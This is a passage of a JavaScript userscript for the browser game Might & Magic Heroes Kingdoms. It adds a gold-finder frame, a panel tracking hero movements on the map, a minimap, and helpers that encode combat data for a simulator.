					overflow:"hidden",
					width:"450px",
					height:"450px",
					backgroundColor:"white"
				});
			$iframe = $("<iframe id='hommk-gold-finder-page' src='"+link+"'></iframe>").css({	
					position:"relative",
					top:"-200px",
					left:"-150px",
					width:"750px",
					height:"900px"
				});
				
			$container.appendTo( $mapfinder);
			$iframe.appendTo( $container);
			
			if(openFinder){
				$mapfinder.dialog('open');
			}
				
			$mapfinder.ifr = $iframe;
				
		})();
			
	
		
		
		
		
		
		toobar_button('<img src="http://www.hommk.net/img/gold.png" /> '+localize("FINDER_BUTTON"),function() {
			
			var size = HOMMK.worldMap.content._size || 280;
			var chinois = (window.location.hostname == "h3.hommk.com" || window.location.hostname == "h2.hommk.com")?10000:(window.location.hostname == "mmhk.ubisoft.com.hk")?20000:0;
			var link = 'http://www.hommk.net/index.php?SERVER='+(HOMMK.player.content.worldId+chinois)+'&ID='+((HOMMK.currentView.regionY-1)*size+HOMMK.currentView.regionX);
			if(!$mapfinder.dialog( "isOpen" ))
				$mapfinder.ifr.attr("src",link);
			toggle_dialog( $mapfinder );
			return false;
	    });

		//------------- VIGIE -----------
(function() {

		var cityList = {};
	// VIGIE BACKUP



//////////////////////////
	var position = localStorage_getObject("HOMMK_vigie_position",{left:'right',top:''});
	
	var $tooltip = $("<div id='hommk-user-vigie-tooltip'></div>")
		.dialog({
			autoOpen:false,
			zIndex: 90000,
			resizable: false,
			title: 'Travel Informations'
		}); 
		
	var $dialog = $("<div id='hommk-user-vigie'></div>")
		.append(
			$("<table id='hommk-user-vigie-table' ></table>")
				.css({width:'100%',border:'solid gray 1px',borderCollapse:'collapse',backgroundColor:'black',color:'white'})		
				
		
		)
		.dialog({
			autoOpen:false,
			zIndex: 90000,
			width: 600,
			minWidth: 600,
			maxWidth: 600,
			position: [position.left,position.top],
			resizable: false,
			title: localize("VIGIE_BUTTON"),
			open: function(event, ui){                       
				//build( this );
				refresh();
				localStorage_setObject("HOMMK_vigie", true );
				HOMMK_user.vigie.visible=1;
			},
			close: function(event, ui){
				//$dialog = null;
				localStorage_setObject("HOMMK_vigie", false );
				HOMMK_user.vigie.visible=0;
			},
			dragStop: function(e,ui) { 
				localStorage_setObject("HOMMK_vigie_position",ui.position);
			}
		}); 


	function toggle_vigie(){
		toggle_dialog($dialog);
	}
	
	function header(){
		$('#hommk-user-vigie-table').append(
			$("<tr></tr>")
				.css({borderCollapse:"collapse",backgroundColor:"black",border:"solid 1px gray",fontSize:"smaller",color:"white"})//,color:"black"
				.html(	"<td></td><td>"+localize("TEXT_ALLIANCE")+"</td><td></td><td>"+localize("TEXT_PLAYER")+"</td><td>"+localize("TEXT_FROM")+"</td><td>"+localize("TEXT_TO")+"</td><td>"+localize("TEXT_ARRIVAL")+"</td>"	)
		);
	}
	
	function modulo(n){
		var s = HOMMK.worldMap.content._size;
		return ((HOMMK.worldMap.content._size+n-1)%s)+1;
	}
	
	function dateToDays(date){
		return Math.floor(date / 60 / 60 / 24);
	}
	
	var global_refresh_id,heroMove,playerData={},lastPos={x:0,y:0};
	
	function refresh(){
	
		// ANTI DOUBLE CALL
		if(HOMMK.currentView.regionX==lastPos.x && HOMMK.currentView.regionY ==lastPos.y)
			return 0;
		lastPos={x:HOMMK.currentView.regionX,y:HOMMK.currentView.regionY};
		
		
		// CHECK FOR MAP VIEW 
		var view = HOMMK.currentView.viewType;
		/*if(view!=1 && view!=2)
			return 0;*/
			
		// SET LAST REFRESH ID
		var current_refresh_id = global_refresh_id = parseInt(Math.random()*999999);
		
		// EMPTY TABLE
		var table = $("#hommk-user-vigie-table").empty();
		
		// GET REQUEST COORDINATES
		var map_size = (view-1)?13:35;
		var x = modulo(HOMMK.currentView.regionX - ((map_size-1)/2));
		var y = modulo(HOMMK.currentView.regionY - ((map_size-1)/2));
		
		// START REQUEST
		do_request(
			{"elParamList":[{"elementType":"HeroMove","ownerType":"WorldMap","ownerId": HOMMK.player.content.worldId,"x":x,"y":y,"w": map_size, "h": map_size }]} // 35 => map_size
			,function(json) {
			
				// RETURN IF OLD CALL 
				if(current_refresh_id != global_refresh_id){
					console.log("refresh merge");
					return 0;
				}
				
				// RETURN IF BAD JSON
				if(!json.d["WorldMap"+HOMMK.player.content.worldId+"HeroMoveList"]){
					console.log("json error",json);
					return 0;
				}
				
				// RETURN IF NO MOVEMENT
				if(!json.d["WorldMap"+HOMMK.player.content.worldId+"HeroMoveList"].length){
					table.append($("<tr><td>"+localize("TEXT_NOMOVE")+" ...</td></tr>"));
					return 0;
				}
					
				// SORT MOVES	
				heroMove = json.d["WorldMap"+HOMMK.player.content.worldId+"HeroMoveList"].sort( function(a,b){ 
						return (a.masterHeroMove.endDate - b.masterHeroMove.endDate); 
					});
				
				
				var prevEndDay;
				
				// FOREACH MOVE
				heroMove.forEach( function(obj) {
				
					// SET DATA
					var playerId = obj.masterHeroMove.playerId || 0;
					var move = obj.masterHeroMove;
					var curEndDay = dateToDays(move.endDate);
					
					// INSERT NEW DAY ROW
					if(prevEndDay != curEndDay){
						prevEndDay = curEndDay;
						$('<td></td>')
							.appendTo($('<tr></tr>').appendTo(table))
							.text(HOMMK.DateUtils.timestampToString(	move.endDate, HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING))
							.attr("colspan", "7")
							.css({textAlign:"center",backgroundColor:"lightgray",color:"black",fontSize:'smaller',border:"solid 1px gray"});
						header();
					}
					
					// NEW MOVE ROW
					var row = $('<tr></tr>')
								.appendTo(table)
								.css({borderCollapse:"collapse",backgroundColor:'white',borderBottom:"solid 4px "+getColor(obj.color,0.8),color:"black",fontWeight:"bold"});	
					function cell(){return $('<td></td>').appendTo(row);}
					// -------------------------------
				
					// Color       
					cell()
						.css("color",getColor(obj.color))
						.text('*'); 
					
					// Alliance      
					cell()
						.text('-')
						.addClass("hommk-gold-vigie-ally-"+playerId);
					
					// Domination       
					cell()
						.addClass("hommk-gold-vigie-str-"+playerId); 
					
					// Name
					cell()
						.text(playerId || "DARK ELVES")
						.addClass("hommk-gold-vigie-player-"+playerId)
						.css('cursor','pointer')
						.click(function(){
							HOMMK.openPlayerProfileFrame( playerId );
							return false;
						});
					
					// From
					cell()
						.text(coord(parseInt(move.x1), parseInt(move.y1)))
						.addClass('hommk-gold-vigie-city-'+parseInt(move.x1)+'-'+parseInt(move.y1))
						.css('cursor','pointer')
						.click(function() {
							HOMMK.worldMap.center(parseInt(move.x1), parseInt(move.y1));
							return false;
						});
					
					// To
					cell()
						.text(coord(parseInt(move.x2), parseInt(move.y2)))
						.addClass('hommk-gold-vigie-city-'+parseInt(move.x2)+'-'+parseInt(move.y2))
						.css('cursor','pointer')
						.click(function() {
							HOMMK.worldMap.center(parseInt(move.x2), parseInt(move.y2));
							return false;
						});
						
					// Arrival  
					var startDate = new Date(move.startDate*1000);
					var arrivalDate = new Date(move.endDate*1000);
					var arrivalTime = format(arrivalDate.getHours())+":"+format(arrivalDate.getMinutes())+":"+format(arrivalDate.getSeconds());
					
					// TOOLTIP INFORMATIONS
					cell()
						.html(arrivalTime + "&nbsp;&nbsp; ->["+localize("TEXT_DETAILS")+"]")
						.css('cursor','pointer')
						.click(function(){
							$tooltip
								.empty()
								.html("hero_"+move.heroId+": "+(obj.type=="H"?"Halt.":"Moving .."))
								.append(
									$('<table></table>')
										.css({backgroundColor:"white",color:"black",width:'100%',border:"solid 2px "+getColor(obj.color,0.8)})
										.append(
											$('<tr></tr>')
												.append($('<td></td>').text('Start City'))
												.append($('<td></td>')
														.text( (move.x1)+"-"+(move.y1) )
														.click(function() {HOMMK.worldMap.center(parseInt(move.x1+0.49), parseInt(move.y1+0.49));})
														.css({cursor:'pointer',fontWeight:'bold'})
												)
												.append($('<td></td>').text(HOMMK.DateUtils.timestampToString(move.startDate, HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING).split(',')[1]))
												.append($('<td></td>').text(format(startDate.getHours())+":"+format(startDate.getMinutes())+":"+format(startDate.getSeconds())))
										)
										.append(
											$('<tr></tr>')
												.append($('<td></td>').text('Last Halt'))
												.append($('<td></td>')
														.text((obj.x1p)+"-"+(obj.y1p))
														.click(function() {HOMMK.worldMap.center(parseInt(obj.x1p+0.49), parseInt(obj.y1p+0.49));})
														.css({cursor:'pointer',fontWeight:'bold'})
												)
												.append($('<td></td>').text(HOMMK.DateUtils.timestampToString(obj.startDate, HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING).split(',')[1]))
												.append($('<td></td>').text(format((tmp = new Date(obj.startDate*1000)).getHours())+":"+format(tmp.getMinutes())+":"+format(tmp.getSeconds())))
										)
										.append(
											$('<tr></tr>')
												.append($('<td></td>').text('Next Halt'))
												.append($('<td></td>')
														.text((obj.x2p)+"-"+(obj.y2p))
														.click(function() {HOMMK.worldMap.center(parseInt(obj.x2p+0.49), parseInt(obj.y2p+0.49));})
														.css({cursor:'pointer',fontWeight:'bold'})
												)
												.append($('<td></td>').text(HOMMK.DateUtils.timestampToString(	obj.endDate, HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING).split(',')[1]))
												.append($('<td></td>').text(format((tmp = new Date(obj.endDate*1000)).getHours())+":"+format(tmp.getMinutes())+":"+format(tmp.getSeconds())))
										)
										.append(
											$('<tr></tr>')
												.append($('<td></td>').text('Destination'))
												.append($('<td></td>')
														.text((move.x2)+"-"+(move.y2))
														.click(function() {HOMMK.worldMap.center(parseInt(move.x2+0.49), parseInt(move.y2+0.49));})
														.css({cursor:'pointer',fontWeight:'bold'})
												)
												.append($('<td></td>').text(HOMMK.DateUtils.timestampToString(	move.endDate, HOMMK.DATEUTILS_TIME_FORMAT_LOCALE_DATE_STRING).split(',')[1]))
												.append($('<td></td>').text(format(arrivalDate.getHours())+":"+format(arrivalDate.getMinutes())+":"+format(arrivalDate.getSeconds())))
										)
								)
								.dialog('open');
						});
					//------------------------------
					
					function setPlayerData(data){
						if(data.wait)	
							return 0;
								
						// SET CITY NAME
						for(var i=0;i<data.cityList.length;i++){
							var city = data.cityList[i];
							$('.hommk-gold-vigie-city-'+city.x+'-'+city.y).text(city.cityName);
						}
								
								
						// SET PLAYER NAME
						$(".hommk-gold-vigie-player-"+data.id).text(data.playerName);
								
						// SET ALLIANCE NAME
						if(data.allianceName){
							$(".hommk-gold-vigie-ally-"+data.id)
								.text(data.allianceName)
								.css('cursor','pointer')
								.click(function(){
									w.openAllianceFrame( data.allianceId );
								});
						}
								
								
						// data.dominationScore
					}
					
					// IF WE HAVE DATA
					if(playerId && playerData["player_"+playerId]){
						// SET DATA
						setPlayerData(playerData["player_"+playerId]);
					}
					else if(playerId){
						// ELSE PREVENT FOR OTHERS REQUESTS 
						playerData["player_"+playerId] = {wait:1};
						// DO REQUEST
						do_request(
							{"elParamList":[{"elementType":"ProfileFrame","elementId":playerId}]}
							,function(json) {
								// SAVE DATA
								playerData["player_"+playerId] = json.d["ProfileFrame"+playerId];
								// SET DATA
								setPlayerData(playerData["player_"+playerId]);
								//console.log(playerData["player_"+playerId]);
							}
						);
					}
						
		
				});
				// set cityName
				HOMMK.elementPool.obj.Region.values().map(function(e){
					if(e.content && e.content.x && e.content.y){
						if(e.content.cN)
							$('.hommk-gold-vigie-city-'+e.content.x+'-'+e.content.y).text(e.content.cN);
						if(e.content.rB && e.content.rB.n)
							$('.hommk-gold-vigie-city-'+e.content.x+'-'+e.content.y).text(e.content.rB.n.toUpperCase());
					} 
				});
			});
	
	
	}

	/////// export for other modules :
	HOMMK_user.vigie = {
		toggle: toggle_vigie,
		visible:false,
		moves:0,
		refresh:refresh
	};
})();




		
		toobar_button("<img src='http://www.hommk.net/img/vigie.png' /> "+localize('VIGIE_BUTTON'),function() {
			//$(this).button('widget').removeClass( "ui-state-focus" );
		    HOMMK_user.vigie.toggle();
            return false;
		});

		
if(localStorage_getObject("HOMMK_vigie",false))
		HOMMK_user.vigie.toggle();

var worldId = HOMMK.player.content.worldId;
var h = window.location.hostname;
var dom = h.substring(h.indexOf("."),h.length);
var asia = (dom != ".ubi.com");
if(dom == ".hommk.com") worldId += 10000; 
else if(dom == ".ubisoft.com.hk") worldId += 20000;
else if(asia) worldId += 30000; 

(function(){

	var $dialog_cartographe = null;
	var currentView = {};
	var size = 0;
	var zoom = 0;
	var zoomSize = 2;
	function move_black_pt(x,y,width){
		var decal = (width-1)/2;
		var z=zoom?zoomSize:1;
		//console.log("x",(x+1-decal)*z,"y",(y+1-decal)*z);
		$('#black_pt').css({left:(x-1-decal)*z,top:(y-3-decal)*z});
		$('.black_pt').css({width:(width*z)+"px",height:(width*z)+"px"});
		$('#minicur').text("("+x+","+y+")");
	}
	function check_currentView() {
		if (!$dialog_cartographe || !$dialog_cartographe.dialog( "isOpen")) 
			return;
		var regionX = HOMMK.currentView.regionX;
		var regionY = HOMMK.currentView.regionY;
		var viewType = HOMMK.currentView.viewType;
		if (   (currentView.regionX != regionX) || (currentView.regionY != regionY)	|| (currentView.viewType != viewType)){
			// currentView has changed
			currentView.regionX = regionX;
			currentView.regionY = regionY;
			currentView.viewType = viewType;
			if ( regionX && regionY		) //&& (viewType==1 || viewType==2)
				move_black_pt(regionX,regionY,(viewType==1?35:13));
		} 
	}
	function zooming(e){
		zoom = 1 - zoom;
		if(!zoom){
			$('#minizoom').text("[zoom+]");
			$('#minimap').css('width',(size)+"px");
			$('#minimap').css('height',(size)+"px");
			$dialog_cartographe.dialog( "option", "width",size+24 );
			$('#minipos').text($('#minipos').text()); // resolve bug size + position
			$dialog_cartographe.dialog({position: ['right','bottom']});
			$('.black_pt').each(function(index) {
				$(this).css({left:(parseInt($(this).css('left'))/2)+"px"});
				$(this).css({top:(parseInt($(this).css('top'))/2)+"px"});
			});
		}
		else{
			$('#minizoom').text("[zoom-]");
			$('#minimap').css('width',(zoomSize*size)+"px");
			$('#minimap').css('height',(zoomSize*size)+"px");
			$dialog_cartographe.dialog( "option", "width",zoomSize*size+24 );
			$('#minipos').text($('#minipos').text()); // resolve bug size + position
			$dialog_cartographe.dialog({position: ['top','center']});
			$('.black_pt').each(function(index) {
				$(this).css({left:(parseInt($(this).css('left'))*2)+"px"});
				$(this).css({top:(parseInt($(this).css('top'))*2)+"px"});
			});
		}
		move_black_pt(HOMMK.currentView.regionX,HOMMK.currentView.regionY,(HOMMK.currentView.viewType==1?35:13));
	}
	function moving(e){
		var z=zoom?zoomSize:1;
		var xx = e.pageX - $('#minimap').offset().left + 1;
		var yy = e.pageY - $('#minimap').offset().top + 1;
		xx=parseInt(xx/z);
		yy=parseInt(yy/z);
		$('#minipos').text("("+xx+","+yy+")");
	}
	function clicking(e){
		var z=zoom?zoomSize:1;
		var xx = e.pageX - $('#minimap').offset().left + 1;
		var yy = e.pageY - $('#minimap').offset().top + 1;
		xx=parseInt(xx/z);
		yy=parseInt(yy/z);
		HOMMK.worldMap.center(xx,yy);
		//$('#minicur').text("("+xx+","+yy+")");
		check_currentView();
	}
	HOMMK_user.carto_toggle = function(){
		var x=HOMMK.currentView.regionX,y=HOMMK.currentView.regionY;
		
		size = HOMMK.worldMap.content._size;
		//.html("<img src=http://www.hommk.net/final/mappa/carto_mini_maker.php?world="+worldId+" width="+HOMMK.worldMap.content._size+" height="+HOMMK.worldMap.content._size+" />")
		if(!$dialog_cartographe) {
			var position = localStorage_getObject("HOMMK_carto_position",{left:'right',top:'bottom'});
			setInterval(check_currentView,1000);
			$dialog_cartographe = jQuery("<div id='hommk-user-map'></div>")
			.html("<div id='minimap' style='overflow:hidden;cursor:pointer;-moz-background-size:100%;background-size:100%;background-image:url(http://www.hommk.net/final/update/mini/"+worldId+".png?t="+((new Date()).getTime())+");position:relative;width:"+size+"px;height:"+size+"px;'>"+
				"<div id='black_pt' style='position:absolute;overflow:visible;' >"+
					"<div class='black_pt'></div>"+
					"<div class='black_pt' style='left:"+size+"px;'></div>"+
					"<div class='black_pt' style='left:-"+size+"px;'></div>"+
					"<div class='black_pt' style='top:"+size+"px;'></div>"+
					"<div class='black_pt' style='top:-"+size+"px;'></div>"+
					"<div class='black_pt' style='left:"+size+"px;top:"+size+"px;'></div>"+
					"<div class='black_pt' style='left:"+size+"px;top:-"+size+"px;'></div>"+
					"<div class='black_pt' style='left:-"+size+"px;top:"+size+"px;'></div>"+
					"<div class='black_pt' style='left:-"+size+"px;top:-"+size+"px;'></div>"+
				"</div>"+
			"</div>"+localize("TEXT_MOUSE")+": <span id='minipos'>(0,0)</span><br/>"+localize("TEXT_CURRENT")+": <span id='minicur'>("+x+","+y+")</span><span id='minizoom' style='position:absolute;bottom:12px;right:18px;font-weight:bold;cursor:pointer;'>["+localize("TEXT_ZOOM")+"+]</span>")
			.dialog({
				zIndex: 90000,
				width:size+24,
				resizable: false,
				position: [position.left,position.top],
				title: localize("VIEW_BUTTON"),
				dragStop: function(e,ui) { 
					localStorage_setObject("HOMMK_carto_position",ui.position);
				},
				open: function(){
					localStorage_setObject("HOMMK_carto", true );
				},
				close: function(){
					localStorage_setObject("HOMMK_carto", false );
				}
			});
			
			$('.black_pt').css({width:'35px',height:'35px',position:'absolute',border:'solid white 2px',backgroundColor:'black'});
			$('.black_pt').fadeTo(0,0.7);
			$('#minimap').mousemove(moving);
			$('#minimap').click(clicking);
			$('#minizoom').click(zooming);
			
			//$dialog_cartographe.dialog( "option", "width",size+24 );
			check_currentView();
		}
		else{
			toggle_dialog( $dialog_cartographe );
		}
	};
})();



///////////////////////// Worldmap
   /* $('<a href="#" target="_blank" style="margin-top:5px; display:block;">World Map</a>')
        .button()
        .appendTo($panel_extended)
        .click(function() {
			HOMMK_user.carto_toggle();
            return false;
	    });*/
		
		toobar_button('<img src="http://www.hommk.net/final/update/mini/'+worldId+'.png" /> '+localize("VIEW_BUTTON"),function() {
			HOMMK_user.carto_toggle();
            return false;
	    });
		
if(localStorage_getObject("HOMMK_carto",false))
		HOMMK_user.carto_toggle();

var capsule = (function() {

var	H = HOMMK;

var set_artefacts_fixer = {_143:524,_144:525,_145:506,_146:507,_147:508,_148:509,_149:510,_150:511,_508:519,_509:521,_510:535,_511:518,_512:522,_513:520,_514:523,_515:512,_516:513,_517:514,_518:515,_519:516,_520:517,_521:532,_522:533,_523:536,_524:537,_525:538,_526:539,_527:540,_528:541,_529:542,_530:543,_531:544,_532:545,_533:546,_534:547,_535:548,_536:549,_537:528,_538:530,_539:531,_540:527,_541:526,_542:529,_543:534,_544:550,_545:551,_546:552,_547:553};
var base_url = 'http://www.hommk.net/jack/';
var url_combat = '';

var _base64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
var _camps = ['attaquant','defenseur'];
var _camps_abr = ['a','d'];
var _factions = {ACADEMY:0,HAVEN:1,INFERNO:2,NECROPOLIS:3,SYLVAN:4,FORTRESS:5,DUNGEON:6,NEUTRAL:7};
var _ecoles = {SUMMON:0,DARK:1,LIGHT:2,DESTRUCTION:3};
var _rangs = {T1:0, T1P:1, T2:2, T2P:3, T3:4, T3P:5, T4:6, T4P:7, T5:8, T5P:9, T6:10, T6P:11, T7:12, T7P:13, T8:14, T8P:15};
var _neutres = {WIND:64, WATER:65, EARTH:66, FIRE:67, DEATHKNIGHT:68, WOLF:86, GNOMESHOOTER:87, GNOME:85, WANDERINGGHOST:88, MANTICORE:89, MINOTAUR:90};
var _archetypes = {ARCANE_MAGE:0, DISTURBED_WIZARD:1, FANATIC_SORCERER:2, ILLUMINATED_PROTECTOR:3, MERCENARY:4, OUTLAND_WARRIOR:5, PALADIN:6, PIT_WARRIOR:7,
	PROTECTOR:8, WARMAGE:9, WARMASTER:10, WARRIOR_MAGE:11, SENACHAL:12, SOBERED_WIZARD:13, EXPLORER:14};
var _slots = {HEAD:0, NECKLACE:1, RING:2, LEFT_HAND:3, CHEST:4, RIGHT_HAND:5, FEET:6, CAPE:7};
var _sorts = {
	FIST_OF_WRATH:0, WASP_SWARM:1, FIRE_TRAP:2, RAISE_DEAD:3, EARTHQUAKE:4, PHANTOM_FORCES:5, SUMMON_ELEMENTALS:6, FIREWALL:7, CONJURE_PHOENIX:8,
	WEAKNESS:9, SICKNESS:10, GUARD_BREAK:11, DISEASE:12, VULNERABILITY:13, SLOW:14, PLAGUE:15, DEATH_TOUCH:16, WORD_OF_DEATH:17,
	DIVINE_STRENGTH:18, BLESS:19, MYSTIC_SHIELD:20, HASTE:21, RIGHTEOUS_MIGHT:22, DEFLECT_MISSILE:23, TELEPORTATION:24, WORD_OF_LIGHT:25, RESURRECTION:26,
	STONE_SPIKES:27, ELDERTICH_ARROW:28, ICE_BOLT:29, LIGHTNING_BOLT:30, CIRCLE_OF_WINTER:31, FIREBALL:32, METEOR_SHOWER:33, CHAIN_LIGHTNING:34, IMPLOSION:35
};
var _competences_hereditaires = {BARRAGE_FIRE: 'tir_de_barrage', MAGIC_RESISTANCE: 'resistance_magique', SPELL_MASTERY: 'maitrise_des_sorts', RESURRECTION: 'resurrection',
	BATTLE_LOOT: 'butin_de_guerre', CHARACTERISTICS_ILLUMINATION: 'revelation_de_caracteristiques', MORAL_BOOST: 'moral_eleve', TOUGHER_HERO: 'heros_superieur', RAISE_DEAD: 'relever_les_morts'};
var _fortifications = {FORT:1, CITADEL:2, CASTLE:3};

function prepare_troupe(donnees) {
	var u = 0;
	if (donnees.factionEntityTagName == 'NEUTRAL' ) u = _neutres[donnees.tier];
	else {
		var rang = _rangs[donnees.tier];
		var faction = _factions[donnees.factionEntityTagName];
		u = (faction * 16) + (rang & 15) + (faction == 4 ? 5 : 0) + (faction >= 5 ? 11 : 0);
	}
	return {unite:u, nombre:donnees.quantity};
};
function prepare_talent(a,talent) {
	switch (talent.heroClassSkillEntityTagName) {
		case 'ARMY_ATTACK_POWER_INCREASE': a.tacticien = talent.level; break;
		case 'CAVALRY_ATTACK_POWER_INCREASE': a.ecuyer = talent.level; break;
		case 'SHOOTER_ATTACK_POWER_INCREASE': a.tireur_elite = talent.level; break;
		case 'INFANTRY_ATTACK_POWER_INCREASE': a.commandant_infanterie = talent.level; break;
		case 'ARMY_DEFENSE_POWER_INCREASE': a.tacticien_defenseur = talent.level; break;
		case 'CAVALRY_DEFENSE_POWER_INCREASE': a.ecuyer_defenseur = talent.level; break;
		case 'SHOOTER_DEFENSE_POWER_INCREASE': a.expert_tirs_barrage = talent.level; break;
		case 'INFANTRY_DEFENSE_POWER_INCREASE': a.inebranlable = talent.level; break;
		case 'ATTRITION_RATE_DECREASE': a.logisticien = talent.level; break;
		case 'SUMMON_ADDED_BATTLE_SPELL_LEVEL': a.arcanes = talent.level; break;
		case 'SUMMON_SPELLBOOK_SPELL_NUMBER': break;
		case 'SUMMON_SPELL_EFFICIENCY': a.expert[0] = talent.level; break;
		case 'SUMMON_ADDED_MAGIC_POINTS': a.instinct[0] = talent.level; break;
		case 'DARK_ADDED_BATTLE_SPELL_LEVEL': a.arcanes = talent.level; break;
		case 'DARK_SPELLBOOK_SPELL_NUMBER': break;
		case 'DARK_SPELL_EFFICIENCY': a.expert[1] = talent.level; break;
		case 'DARK_ADDED_MAGIC_POINTS': a.instinct[1] = talent.level; break;
		case 'LIGHT_ADDED_BATTLE_SPELL_LEVEL': a.arcanes = talent.level; break;
		case 'LIGHT_SPELLBOOK_SPELL_NUMBER': break;
		case 'LIGHT_SPELL_EFFICIENCY': a.expert[2] = talent.level; break;
		case 'LIGHT_ADDED_MAGIC_POINTS': a.instinct[2] = talent.level; break;
		case 'DESTRUCTION_ADDED_BATTLE_SPELL_LEVEL': a.arcanes = talent.level; break;
		case 'DESTRUCTION_SPELLBOOK_SPELL_NUMBER': break;
		case 'DESTRUCTION_SPELL_EFFICIENCY': a.expert[3] = talent.level; break;
		case 'DESTRUCTION_ADDED_MAGIC_POINTS': a.instinct[3] = talent.level; break;
		case 'UNIT_PRODUCTION_INCREASE': break;
		case 'UNIT_RECRUITMENT_SPEED_INCREASE': break;
		case 'NEUTRAL_STACK_RECRUITMENT_INCREASE': break;
		case 'ATTACK_POWER_PER_UNIT_INCREASE': a.harangueur = talent.level; break;
		case 'SCOUTING_DETECT_LEVEL_INCREASE': break;
		case 'ATTRITION_RATE_INCREASE': a.massacreur = talent.level; break;
		case 'PILLAGE_INCREASE': break;
		case 'DEFENSE_POWER_PER_UNIT_INCREASE': a.bon_payeur = talent.level; break;
	}
};
function prepare_heros(a,heros) {
	a.faction = _factions[heros.factionEntityTagName];
	a.statut = 1;
	a.heros = 1;
	a.niveau = heros._level;
	a.archetype = _archetypes[heros.heroTrainingEntityTagName];
	a.malus_attaque = 0;
};
function prepare_artefacts(a,artefacts) {
	var artefact, id, slot,artefacts=artefacts||[];
	for (var i = 0; i < artefacts.length; i++ )	{
		artefact = artefacts[i].artefactEntity;
		slot = _slots[artefact.bodyPart];
		//console.log(slot,artefact.id);
		id = artefact.id;
		if(set_artefacts_fixer['_'+id])
			id=set_artefacts_fixer['_'+id];
		a.artefacts[slot] = id;
	}
};
var heredite = (function() {
	var competences = [];
	var cv = {d:0, w:0, h:0};
	function init() {
		if(cache.heredity){
			//console.log(cache);
			competences = cache.heredity.skills;
			cv = cache.heredity.way;
		}
		else		
		do_request(
			{"elParamList":[{"elementType":"ProfileFrame","elementId":H.player.content.id}]},
			function(json){
				for (var c = 0; c < json.d['ProfileFrame'+H.player.content.id].playerHeredityAbilityList.length; c++) {
					var comp = json.d['ProfileFrame'+H.player.content.id].playerHeredityAbilityList[c];
					competences.push({level:comp.level,heredityAbilityEntity:{tagName:comp.heredityAbilityEntity.tagName}});
					var voie = comp.heredityAbilityEntity.rankingPath.substr(0,1).toLowerCase();
					if (comp.bonus == true) 
						cv[voie] = 3;
					else if (comp.malus == true) 
						cv[voie] = 1;
					else 
						cv[voie] = 2;
				}
				/*cache.heredity = cache.heredity || {};
				cache.heredity.skills = competences;
				cache.heredity.way = cv;
				saveCache();*/
			}
		);
	}
	return {init:init, competences:competences, cv:cv};
})();


	/*
	// guildes 5 beta
	var cities = HOMMK.elementPool.obj.RegionCity.values();
	for(var i=0;i<cities.length;i++){
		var city = cities[i].content;
		if(city && city.factionEntityName && city.tmpBuiltCityBuilding && city.tmpBuiltCityBuilding[23]){
			console.log('city detected');
			console.log(city.factionEntityName.toUpperCase());
			console.log(_factions[city.factionEntityName.toUpperCase()]);
			donnees.a.bonus_ecole[_factions[city.factionEntityName.toUpperCase()]]++;
			console.log(donnees.a.bonus_ecole);
		}
		console.log(donnees.a.bonus_ecole);
		{"elParamList":[{"elementType":"MagicGuildFrame","elementId":197471}]}
		LIGHT DESTRUCTION DARK SUMMON
	}*/
	
var bonus = (function() {
	var data = {graal:0,dolmen:0,cri:0,def:0,ecoles:[0,0,0,0]};
	function init() {
		/*var mapper=[];
		var maps = HOMMK.elementPool.obj.WorldMap.obj[worldId].content.attachedRegionList;
		for(var i=0;i<maps.length;i++){
			if(maps[i]._iaId && maps[i]._iaId == allianceId && maps[i].rB)
				mapper.push(maps[i]);
				// maps[i].rB.rBE.tN == "LEARNING_STONE" <- request to know how many add % xp
				
		}
		console.log(mapper);*/
		if(H.player.content.allianceId)
			do_request(
				{"elParamList":[{"elementType":"ViewAllianceFrame","elementId":H.player.content.allianceId}]},
				function(json){
					data.graal = json.d['ViewAllianceFrame'+H.player.content.allianceId].cumulTear || 0;
					var ability = json.d['ViewAllianceFrame'+H.player.content.allianceId].runningAbility;
					data.cri = (ability && ability.abilityEntityId==1)?ability.level:0;
					data.def = (ability && ability.abilityEntityId==2)?ability.level:0;
				}
			);
		var cities = HOMMK.elementPool.obj.RegionCity.values();
		for(var i=0;i<cities.length;i++){
			var city = cities[i].content;
			if(city && city.id && city.tmpBuiltCityBuilding && city.tmpBuiltCityBuilding[23]){
				//console.log("CITY: "+city.id);
				if(cache.citySkills && cache.citySkills[city.id] && cache.citySkills[city.id][0].length == 9){
					var skillName = cache.citySkills[city.id][0][8];
					var ecole = cache.skills[skillName][0].attachedSpellEntity.magicSchoolEntityTagName;
					data.ecoles[_ecoles[ecole]]++;
					continue;
				}
				do_request(
					{"elParamList":[{"elementType":"MagicGuildFrame","elementId":city.id}]},
					(function(id){
					return function(json){
							var skills = json.d['MagicGuildFrame'+id].spellStackList;
							//console.log(skills[8].attachedSpellEntity.magicSchoolLevel);
							if(skills[8] && skills[8].attachedSpellEntity.magicSchoolLevel == 5){
							
								//console.log('JKLHJHH',skills[8].attachedSpellEntity.magicSchoolEntityTagName);
								data.ecoles[_ecoles[skills[8].attachedSpellEntity.magicSchoolEntityTagName]]++;
							}
							//console.log("BONUS: ",data);
						};
					})(city.id)
				);
			}
		}
	}
	return {init:init, data:data};
})();



function encode_donnees_combat(donnees) {
//console.log(donnees);
	var triplets = [];
	var version = 5;
	triplets[0] |= (version & 63) << 18;
	triplets[0] |= (donnees.d.lieu & 3) << 16;
	triplets[0] |= (donnees.a.statut & 1) << 15;
	triplets[0] |= (donnees.a.heros & 1) << 14;
	triplets[0] |= (donnees.a.cri_de_guerre & 3) << 12;
	triplets[0] |= (donnees.a.inspiration & 3) << 10;
	triplets[0] |= (donnees.a.dolmens & 15) << 6;
	triplets[0] |= (donnees.a.niveau & 63);
	triplets[1] |= (donnees.a.artefacts[0] & 2047) << 13;
	triplets[1] |= (donnees.a.tacticien & 3) << 11;
	triplets[1] |= (donnees.a.artefacts[1] & 2047);
	triplets[2] |= (donnees.a.artefacts[2] & 2047) << 13;
	triplets[2] |= (donnees.a.ecuyer & 3) << 11;
	triplets[2] |= (donnees.a.artefacts[3] & 2047);
	triplets[3] |= (donnees.a.artefacts[4] & 2047) << 13;
	triplets[3] |= (donnees.a.tireur_elite & 3) << 11;
	triplets[3] |= (donnees.a.artefacts[5] & 2047);
	//console.log(triplets[3]);
